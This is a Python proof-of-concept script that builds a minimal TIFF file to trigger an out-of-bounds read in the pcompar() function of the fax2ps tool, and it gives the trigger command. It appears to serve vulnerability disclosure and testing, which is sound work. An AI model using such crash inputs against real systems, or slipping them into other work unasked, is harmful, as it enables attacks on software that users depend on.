#!/usr/bin/env python3
"""
PoC generator for VULN-001: pcompar() OOB read in fax2ps (CWE-125)

The vulnerability is in pcompar() at lines 309-315 of tools/fax2ps.c.
pcompar() casts void* to const int* and reads 4 bytes, but the pages[]
array elements are sizeof(uint16)=2 bytes. When qsort compares elements,
it reads 2 bytes beyond the allocation boundary at the last element.

Trigger: fax2ps -p 1 vuln_001.tif
"""

import struct
import os
import sys

OUTPUT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "vuln_001.tif")

def make_tiff():
    """Construct a minimal valid little-endian TIFF that fax2ps can open."""

    # TIFF tag constants
    BYTE     = 1
    SHORT    = 3
    LONG     = 4
    RATIONAL = 5

    # We need to build the IFD manually.
    # Tags required for fax2ps to open without crashing early:
    #   256 ImageWidth            SHORT 1   value
    #   257 ImageLength           SHORT 1   value
    #   258 BitsPerSample         SHORT 1   1      (bilevel)
    #   259 Compression           SHORT 1   1      (no compression)
    #   262 PhotometricInterp.    SHORT 1   0      (WhiteIsZero)
    #   273 StripOffsets          LONG  1   offset
    #   278 RowsPerStrip          SHORT 1   height
    #   279 StripByteCounts       LONG  1   byte count
    #   282 XResolution           RATIONAL  72/1
    #   283 YResolution           RATIONAL  72/1
    #   296 ResolutionUnit        SHORT 1   2 (inch)
    #   305 Software              (optional, skip)

    width  = 8
    height = 1
    image_data = b'\xff' * ((width + 7) // 8 * height)  # 1 byte: all black

    # Header: II (little-endian), magic 42, offset of first IFD = 8
    header = struct.pack('<2sHI', b'II', 42, 8)

    num_tags = 11

    # IFD starts at offset 8
    # Each IFD entry: tag(2) type(2) count(4) value_or_offset(4) = 12 bytes
    ifd_size = 2 + num_tags * 12 + 4  # count field + entries + next IFD ptr
    ifd_offset = 8

    # Data area starts after IFD
    data_offset = ifd_offset + ifd_size

    # Rational values (8 bytes each): XRes and YRes
    xres_offset = data_offset
    yres_offset = xres_offset + 8
    image_offset = yres_offset + 8

    def ifd_entry(tag, typ, count, value):
        return struct.pack('<HHII', tag, typ, count, value)

    entries = b''
    entries += ifd_entry(256, SHORT, 1, width)           # ImageWidth
    entries += ifd_entry(257, SHORT, 1, height)          # ImageLength
    entries += ifd_entry(258, SHORT, 1, 1)               # BitsPerSample
    entries += ifd_entry(259, SHORT, 1, 1)               # Compression = None
    entries += ifd_entry(262, SHORT, 1, 0)               # PhotometricInterp = WhiteIsZero
    entries += ifd_entry(273, LONG,  1, image_offset)    # StripOffsets
    entries += ifd_entry(278, SHORT, 1, height)          # RowsPerStrip
    entries += ifd_entry(279, LONG,  1, len(image_data)) # StripByteCounts
    entries += ifd_entry(282, RATIONAL, 1, xres_offset)  # XResolution
    entries += ifd_entry(283, RATIONAL, 1, yres_offset)  # YResolution
    entries += ifd_entry(296, SHORT, 1, 2)               # ResolutionUnit = inch

    ifd = struct.pack('<H', num_tags) + entries + struct.pack('<I', 0)  # next IFD = 0

    # Rational data: numerator=72, denominator=1
    xres_data = struct.pack('<II', 72, 1)
    yres_data = struct.pack('<II', 72, 1)

    tiff = header + ifd + xres_data + yres_data + image_data
    return tiff


def main():
    tiff_bytes = make_tiff()
    with open(OUTPUT, 'wb') as f:
        f.write(tiff_bytes)
    print(f"[+] Written {len(tiff_bytes)} bytes to {OUTPUT}")


if __name__ == '__main__':
    main()
